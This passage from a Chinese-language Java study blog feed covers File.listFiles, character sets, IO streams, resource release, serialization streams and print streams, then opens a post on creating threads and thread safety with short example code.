<td>获取当前目录下所有的<strong>一级文件名称</strong>到一个字符串数组中去返回。</td>
</tr>
<tr>
<td><code>public File[] listFiles()(常用)</code></td>
<td>获取当前目录下所有的<strong>一级文件对象</strong>到一个文件对象数组中去返回（重点）</td>
</tr>
</tbody></table>
<ul>
<li>listFIles 注意事项<ul>
<li>当调用者不存在时，返回 null</li>
<li>当调用者是文件夹时，返回 null</li>
<li>当调用者是一个空文件夹时，返回长度为0的数组</li>
<li>当调用者是一个有内容的文件夹时，将里面所有的文件和文件夹的路径放在 File 数组中返回</li>
<li>当调用者是一个有隐藏文件的文件夹时，会将所有内容返回，包括隐藏文件</li>
<li>当调用者是一个有权限的文件夹时，返回 null</li>
</ul>
</li>
</ul>
<h4 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h4><h5 id="认识一下嘛-1"><a href="#认识一下嘛-1" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>计算机底层不可以直接存储字符，只能存储二进制</li>
<li>二进制可以转化为十进制，十进制编号</li>
<li>计算机可以给人类字符进行编号存储，这套编号规则就是字符集</li>
</ul>
<h5 id="常见字符集"><a href="#常见字符集" class="headerlink" title="常见字符集"></a>常见字符集</h5><ul>
<li>ASCII<ul>
<li>美国信息交换标准码</li>
<li>一个字节存储一个字符，一个字节是8位，即2的八次方，对于英文，数字够用</li>
</ul>
</li>
<li>GBK<ul>
<li>windows系统默认的码表，兼容 ASCII 码表，也包含几万汉字，并支持繁体汉字以及部分日韩文字</li>
<li>GBK 是中国的码表，一个中文以两个字节的形式存储</li>
</ul>
</li>
<li>Unicode<ul>
<li>又称统一码，万国码，单一码</li>
<li>容纳有世界上大多数国家的所有常见文字和符号</li>
<li>Unicode 会先通过 UTF-8，UTF-6 以及 UTF-32 的编码成二进制后再存储到计算机中</li>
<li>UTF-8 编码后一个中文一般以三个字节形式存储</li>
</ul>
</li>
</ul>
<h5 id="编码解码方法"><a href="#编码解码方法" class="headerlink" title="编码解码方法"></a>编码解码方法</h5><ul>
<li><p>String 编码</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>byte[] getBytes()</code></td>
<td>使用平台的默认字符集将该  String编码为一系列字节，将结果存储到新的字节数组中</td>
</tr>
<tr>
<td><code>byte[] getBytes(String charsetName)</code></td>
<td>使用指定的字符集将该 String编码为一系列字节，将结果存储到新的字节数组中</td>
</tr>
</tbody></table>
</li>
<li><p>String 解码</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>String(byte[] bytes)</code></td>
<td>通过使用平台的默认字符集解码指定的字节数组来构造新的  String</td>
</tr>
<tr>
<td><code>String(byte[] bytes, String charsetName)</code></td>
<td>通过指定的字符集解码指定的字节数组来构造新的 String</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="IO-流概述"><a href="#IO-流概述" class="headerlink" title="IO 流概述"></a>IO 流概述</h4><h5 id="认识一下嘛-2"><a href="#认识一下嘛-2" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>IO 流也成为输入、输出流，就是用来读写数据的</li>
<li>I 表示 Input，是数据从磁盘文件读到内存的过程，称之为输入，负责读</li>
<li>O 表示 Output，是内存数据从内存写到磁盘文件的过程，称之为输出，负责写</li>
</ul>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul>
<li>字节流：操作所有类型的文件</li>
<li>字符流：只能操作纯文本文件</li>
</ul>
<h4 id="字节流的使用"><a href="#字节流的使用" class="headerlink" title="字节流的使用"></a>字节流的使用</h4><h5 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  FileInputStream(File file)</code></td>
<td>创建字节输入流管道与源文件对象接通</td>
</tr>
<tr>
<td><code>public  FileInputStream(String pathname)</code></td>
<td>创建字节输入流管道与源文件路径接通</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public int  read()</code></td>
<td>每次读取一个字节返回，如果字节已经没有可读的返回-1</td>
</tr>
<tr>
<td><code>public int  read(byte[] buffer)</code></td>
<td>每次读取一个字节数组返回，如果字节已经没有可读的返回-1</td>
</tr>
<tr>
<td><code>public byte[] readAllBytes() throws IOException</code></td>
<td>直接将当前字节输入流对应的文件对象的字节数据装到一个字节数组返回</td>
</tr>
</tbody></table>
<h5 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public FileOutputStream(File file)</code></td>
<td>创建字节输出流管道与源文件对象接通</td>
</tr>
<tr>
<td><code>public FileOutputStream(File file，boolean append)</code></td>
<td>创建字节输出流管道与源文件对象接通，可追加数据</td>
</tr>
<tr>
<td><code>public FileOutputStream(String filepath)</code></td>
<td>创建字节输出流管道与源文件路径接通</td>
</tr>
<tr>
<td><code>public FileOutputStream(String filepath，boolean append)</code></td>
<td>创建字节输出流管道与源文件路径接通，可追加数据</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public void write(int a)</code></td>
<td>写一个字节出去</td>
</tr>
<tr>
<td><code>public void write(byte[] buffer)</code></td>
<td>写一个字节数组出去</td>
</tr>
<tr>
<td><code>public void write(byte[] buffer , int pos , int len)</code></td>
<td>写一个字节数组的一部分出去。</td>
</tr>
</tbody></table>
<h5 id="流的刷新与关闭"><a href="#流的刷新与关闭" class="headerlink" title="流的刷新与关闭"></a>流的刷新与关闭</h5><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>flush()</code></td>
<td>刷新流，还可以继续写数据</td>
</tr>
<tr>
<td><code>close()</code></td>
<td>关闭流，释放资源，但是在关闭之前会先刷新流。一旦关闭，就不能再写数据</td>
</tr>
</tbody></table>
<h4 id="资源释放的方式"><a href="#资源释放的方式" class="headerlink" title="资源释放的方式"></a>资源释放的方式</h4><h5 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h5><ul>
<li><p>finally：在异常处理时，提供 finally 块来执行所有清除操作，比如 IO 流中的资源释放</p>
</li>
<li><p>被 finally 控制的语句最终一定会执行，除非 JVM 退出</p>
</li>
<li><p>格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  <span class="comment">// 正常语句</span></span><br><span class="line">&#125;<span class="keyword">catch</span> (Expection e)&#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">  <span class="comment">// 最终执行的语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>可以在 finally 块中最后释放资源</p>
</li>
</ul>
<h5 id="try-with-resource"><a href="#try-with-resource" class="headerlink" title="try-with-resource"></a>try-with-resource</h5><ul>
<li><p>虽然上面的办法可以用于释放资源，但是释放的代码过于繁琐</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream is = <span class="keyword">null</span> ;</span><br><span class="line">OutputStream os = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// 关闭资源！</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(os != <span class="keyword">null</span>) os.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(is != <span class="keyword">null</span>) is.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>改进后的方案</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">定义输入流对象;</span><br><span class="line">定义输出流对象;</span><br><span class="line"><span class="keyword">try</span>(输入流对象；输出流对象)&#123;</span><br><span class="line">  可能出现异常的代码;</span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类名 变量名)&#123;</span><br><span class="line">  异常的处理代码;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
<li><p>注意：</p>
<ul>
<li>try 后面的小括号只能放资源对象，否则就会报错</li>
<li>所谓资源对象就是实现了 Closeable/AutoCloseable 接口的对象</li>
</ul>
</li>
</ul>
<h4 id="字符流的使用"><a href="#字符流的使用" class="headerlink" title="字符流的使用"></a>字符流的使用</h4><h5 id="Reader"><a href="#Reader" class="headerlink" title="Reader"></a>Reader</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public FileReader(File file)</code></td>
<td>创建字符输入流管道与源文件对象接通</td>
</tr>
<tr>
<td><code>public FileReader(String  pathname)</code></td>
<td>创建字符输入流管道与源文件路径接通</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public int read()</code></td>
<td>每次读取一个字符返回，如果字符已经没有可读的返回-1</td>
</tr>
<tr>
<td><code>public int  read(char[] buffer)</code></td>
<td>每次读取一个字符数组，返回读取的字符个数，如果字符已经没有可读的返回-1</td>
</tr>
</tbody></table>
<h5 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public FileWriter(File file)</code></td>
<td>创建字符输出流管道与源文件对象接通</td>
</tr>
<tr>
<td><code>public FileWriter(File file，boolean append)</code></td>
<td>创建字符输出流管道与源文件对象接通，可追加数据</td>
</tr>
<tr>
<td><code>public FileWriter(String filepath)</code></td>
<td>创建字符输出流管道与源文件路径接通</td>
</tr>
<tr>
<td><code>public FileWriter(String filepath，boolean append)</code></td>
<td>创建字符输出流管道与源文件路径接通，可追加数据</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>void  write(int c)</code></td>
<td>写一个字符</td>
</tr>
<tr>
<td><code>void  write(char[] cbuf)</code></td>
<td>写入一个字符数组</td>
</tr>
<tr>
<td><code>void  write(char[] cbuf, int off, int len)</code></td>
<td>写入字符数组的一部分</td>
</tr>
<tr>
<td><code>void  write(String str)</code></td>
<td>写一个字符串</td>
</tr>
<tr>
<td><code>void  write(String str, int off, int len)</code></td>
<td>写一个字符串的一部分</td>
</tr>
<tr>
<td><code>void  write(int c)</code></td>
<td>写一个字符</td>
</tr>
</tbody></table>
<h5 id="流的刷新与关闭-1"><a href="#流的刷新与关闭-1" class="headerlink" title="流的刷新与关闭"></a>流的刷新与关闭</h5><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>flush()</code></td>
<td>刷新流，还可以继续写数据</td>
</tr>
<tr>
<td><code>close()</code></td>
<td>关闭流，释放资源，但是在关闭之前会先刷新流。一旦关闭，就不能再写数据</td>
</tr>
</tbody></table>
<h4 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h4><h5 id="认识一下嘛-3"><a href="#认识一下嘛-3" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>缓冲流也称为高级流、高效流</li>
<li>缓冲流自带缓冲区、可以提高原始流独写数据的性能</li>
</ul>
<h5 id="字节缓冲流"><a href="#字节缓冲流" class="headerlink" title="字节缓冲流"></a>字节缓冲流</h5><ul>
<li><p>BufferedInputStream &amp; BufferedOutputStream 只是提高了性能，功能方法上并无变化</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public BufferedInputStream(InputStream is)</code></td>
<td>可以把低级的字节输入流包装成一个高级的缓冲字节输入流管道，从而提高字节输入流读数据的性能</td>
</tr>
<tr>
<td><code>public BufferedOutputStream(OutputStream os)</code></td>
<td>可以把低级的字节输出流包装成一个高级的缓冲字节输出流，从而提高写数据的性能</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="字符缓冲流"><a href="#字符缓冲流" class="headerlink" title="字符缓冲流"></a>字符缓冲流</h5><ul>
<li><p>BufferedReader 除了提高性能外，还<strong>多了一个按行读取数据</strong>的功能</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  BufferedReader(Reader r)</code></td>
<td>可以把低级的字符输入流包装成一个高级的缓冲字符输入流管道，从而提高字符输入流读数据的性能</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  String readLine()</code></td>
<td>读取一行数据返回，如果读取没有完毕，无行可读返回null</td>
</tr>
</tbody></table>
</li>
<li><p>BufferWriter 除了提高性能外，还<strong>多了一个换行的</strong>功能</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public BufferedWriter(Writer  w)</code></td>
<td>可以把低级的字符输出流包装成一个高级的缓冲字符输出流管道，从而提高字符输出流写数据的性能</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  void newLine()</code></td>
<td>换行操作</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h4><h5 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h5><ul>
<li>如果代码编码和文件编码不一致，使用字符流直接读取会出现乱码</li>
<li>使用转换流封装之后，可以避免这一问题</li>
</ul>
<h5 id="字符输入转换流"><a href="#字符输入转换流" class="headerlink" title="字符输入转换流"></a>字符输入转换流</h5><ul>
<li><p>InputStreamReader，可以把原始的字节流按照指定编码转换成字符输入流</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public InputStreamReader(InputStream is)</code></td>
<td>可以把原始的字节流按照代码默认编码转换成字符输入流。几乎不用，与默认的FileReader一样。</td>
</tr>
<tr>
<td><code>public InputStreamReader(InputStream is ，String charset)</code></td>
<td>可以把原始的字节流按照指定编码转换成字符输入流，这样字符流中的字符就不乱码了(重点)</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="字符输出转换流"><a href="#字符输出转换流" class="headerlink" title="字符输出转换流"></a>字符输出转换流</h5><ul>
<li><p>OutputStreamWriter，可以把字节输出流按照指定编码转换成字符输出流</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public OutputStreamWriter(OutputStream os)</code></td>
<td>可以把原始的字节输出流按照代码默认编码转换成字符输出流。几乎不用。</td>
</tr>
<tr>
<td><code>public OutputStreamWriter(OutputStream os，String  charset)</code></td>
<td>可以把原始的字节输出流按照指定编码转换成字符输出流(重点)</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h4><h5 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h5><ul>
<li><p>把内存中的对象存储到磁盘文件中去</p>
</li>
<li><p>序列化的对象必须实现了<strong>序列化接口</strong></p>
</li>
<li><p>对象字节输出流：ObjectOutputStream</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public ObjectOutputStream(OutputStream  out)</code></td>
<td>把低级字节输出流包装成高级的对象字节输出流</td>
</tr>
</tbody></table>
</li>
<li><p>序列化方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public final void writeObject(Object obj)</code></td>
<td>把对象写出去到对象序列化流的文件中去</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="对象反序列化"><a href="#对象反序列化" class="headerlink" title="对象反序列化"></a>对象反序列化</h5><ul>
<li><p>把磁盘文件中的对象恢复到内存中的对象</p>
</li>
<li><p>对象字节输入流：ObjectInputStream</p>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public ObjectInputStream(InputStream  out)</code></td>
<td>把低级字节输如流包装成高级的对象字节输入流</td>
</tr>
</tbody></table>
</li>
<li><p>反序列化方法</p>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public  Object readObject()</code></td>
<td>把存储到磁盘文件中去的对象数据恢复成内存中的对象返回</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h4><h5 id="认识一下嘛-4"><a href="#认识一下嘛-4" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>该流可以实现方便、高效的打印数据到文件中去</li>
<li>一般指 PrintStream，PrintWriter 两个类</li>
<li>可以实现打印什么数据就是什么数据</li>
</ul>
<h5 id="PrintStream"><a href="#PrintStream" class="headerlink" title="PrintStream"></a>PrintStream</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public PrintStream(OutputStream os)</code></td>
<td>打印流直接通向字节输出流管道</td>
</tr>
<tr>
<td><code>public PrintStream(File f)</code></td>
<td>打印流直接通向文件对象</td>
</tr>
<tr>
<td><code>public PrintStream(String filepath)</code></td>
<td>打印流直接通向文件路径</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public void print(Xxx  xx)</code></td>
<td>打印任意类型的数据出去</td>
</tr>
</tbody></table>
<h5 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h5><table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public PrintWriter(OutputStream os)</code></td>
<td>打印流直接通向字节输出流管道</td>
</tr>
<tr>
<td><code>public PrintWriter (Writer w)</code></td>
<td>打印流直接通向字符输出流管道</td>
</tr>
<tr>
<td><code>public PrintWriter (File f)</code></td>
<td>打印流直接通向文件对象</td>
</tr>
<tr>
<td><code>public PrintWriter (String filepath)</code></td>
<td>打印流直接通向文件路径</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public void print(Xxx  xx)</code></td>
<td>打印任意类型的数据出去</td>
</tr>
</tbody></table>
<h5 id="输出语句重定向"><a href="#输出语句重定向" class="headerlink" title="输出语句重定向"></a>输出语句重定向</h5><ul>
<li><p>属于打印流的一种应用，可以打印的位置改到指定位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">&quot;文件地址&quot;</span>);</span><br><span class="line">System.setOut(ps);</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>愿天堂没有Java之线程</title>
    <url>/2022/01/18/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java/%E6%84%BF%E5%A4%A9%E5%A0%82%E6%B2%A1%E6%9C%89Java%E4%B9%8B%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>JavaSE 笔记（八）</strong></p>
<span id="more"></span>

<blockquote>
<p>Java 是一门非常严谨的语言</p>
</blockquote>
<h4 id="线程概述"><a href="#线程概述" class="headerlink" title="线程概述"></a>线程概述</h4><h5 id="认识一下嘛"><a href="#认识一下嘛" class="headerlink" title="认识一下嘛"></a>认识一下嘛</h5><ul>
<li>Java 是通过 java.lang.Thread 类来代表线程的</li>
<li>线程是程序内部的一条执行路径</li>
<li>mian 方法的执行其实就是一条单独的执行路径，这种程序也叫做单线程程序</li>
</ul>
<h5 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h5><ul>
<li>是指从软硬件上实现多条执行流程的技术</li>
<li>消息通信、淘宝、京东系统都离不开多线程技术</li>
</ul>
<h4 id="多线程的创建"><a href="#多线程的创建" class="headerlink" title="多线程的创建"></a>多线程的创建</h4><h5 id="继承-Thread-类"><a href="#继承-Thread-类" class="headerlink" title="继承 Thread 类"></a>继承 Thread 类</h5><ol>
<li>定义一个子类 MyThread 继承 Thread 类，重写 run() 方法</li>
<li>创建 MyThread 类的对象</li>
<li>调用线程对象的 start() 方法启动线程（启动之后还是执行 run() 方法）</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 定义线程要做的事情</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Thread t = <span class="keyword">new</span> MyThread();</span><br><span class="line">    t.start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>只有调用 start 方法才是启动一个新的线程执行，如果直接调用 run 就会被当成普通方法执行</li>
<li>该方式编码简单，但是线程类已经继承 Thread，无法继承其他类，不利于扩展</li>
</ul>
<h5 id="实现-Runnable-接口"><a href="#实现-Runnable-接口" class="headerlink" title="实现 Runnable 接口"></a>实现 Runnable 接口</h5><ol>
<li>定义一个子类 MyThread 实现 Runnable 接口，重写 run() 方法</li>
<li>创建 MyRunnable 任务对象</li>
<li>把 MyRunnable 任务对象交给 Thread 处理</li>
<li>调用线程对象的 start() 方法启动线程</li>
</ol>
<table>
<thead>
<tr>
<th>构造器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public Thread(Runnable target)</code></td>
<td>封装Runnable对象成为线程对象</td>
</tr>
<tr>
<td><code>public Thread(Runnable target, String name )</code></td>
<td>封装Runnable对象成为线程对象，并指定线程名称</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 定义线程要做的事情</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Runnable target = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(target)</span><br><span class="line">    t.start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上代码可以简化为</span></span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;子线程2执行输出：&quot;</span> + i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>

<ul>
<li>该方式可以继续继承类和实现接口，扩展性很强；但是线程执行有结果没办法返回</li>
</ul>
<h5 id="实现-Callable-接口"><a href="#实现-Callable-接口" class="headerlink" title="实现 Callable 接口"></a>实现 Callable 接口</h5><ol>
<li>定义类实现 Callable 接口，重写 call 方法，封装任务</li>
<li>用 FutureTask 把 Callable 对象封装成线程任务对象</li>
<li>把线程任务对象交给 Thread 处理</li>
<li>调用 start 方法启动线程，执行任务</li>
<li>执行完毕之后，通过 FutureTask 的 get 方法去获取任务执行的结果</li>
</ol>
<table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public FutureTask&lt;&gt;(Callable call)</code></td>
<td>把Callable对象封装成FutureTask对象。</td>
</tr>
<tr>
<td><code>public V get() throws Exception</code></td>
<td>获取线程执行call方法返回的结果。</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCallable</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 结果;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Callable&lt;String&gt; call = <span class="keyword">new</span> MyCallable();</span><br><span class="line">    FutureTask&lt;String&gt; f = <span class="keyword">new</span> FutureTask&lt;&gt;(call);</span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(f);</span><br><span class="line">    t.start();</span><br><span class="line">    System.out.println(<span class="string">&quot;结果：&quot;</span> + f.get());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Thread-常用方法"><a href="#Thread-常用方法" class="headerlink" title="Thread 常用方法"></a>Thread 常用方法</h4><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>String getName()</code></td>
<td>获取当前线程的名称，默认线程名称是Thread-索引</td>
</tr>
<tr>
<td><code>void setName(String name)</code></td>
<td>将此线程的名称更改为指定的名称，通过构造器也可以设置线程名称</td>
</tr>
<tr>
<td><code>public static Thread currentThread()</code></td>
<td>返回对当前正在执行的线程对象的引用</td>
</tr>
<tr>
<td><code>public static void sleep(long time)</code></td>
<td>让当前线程休眠指定的时间后再继续执行，单位为毫秒</td>
</tr>
<tr>
<td><code>public  void run()</code></td>
<td>线程任务方法</td>
</tr>
<tr>
<td><code>public  void start()</code></td>
<td>线程启动方法</td>
</tr>
</tbody></table>
<h5 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h5><table>
<thead>
<tr>
<th>方法名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>public Thread(String name)</code></td>
<td>可以为当前线程指定名称</td>
</tr>
<tr>
<td><code>public Thread(Runnable target)</code></td>
<td>封装Runnable对象成为线程对象</td>
</tr>
<tr>
<td><code>public Thread(Runnable target, String name)</code></td>
<td>封装Runnable对象成为线程对象，并指定线程名称</td>
</tr>
</tbody></table>
<h4 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h4><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><ul>
<li>多个线程同时操作同一个共享资源时，会出现的业务安全问题</li>
<li>例如：两人拥有共同账户10万元，同时来取钱，并且都取走10万元。每个线程要进行的任务为：1、判断余额是否足够 2、吐出10万元 3、更新账户余额。当两个线程同时运行时，有可能出现两个线程都通过第一步，并执行第二步的情况。</li>
</ul>
<h5 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h5><ul>
<li>存在多线程并发</li>
<li>同时访问共享资源</li>
<li>存在修改共享资源</li>
</ul>
<h4 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h4><h5 id="解决线程安全问题"><a href="#解决线程安全问题" class="headerlink" title="解决线程安全问题"></a>解决线程安全问题</h5><ul>
<li>让多个线程实现先后依次访问共享资源</li>
</ul>
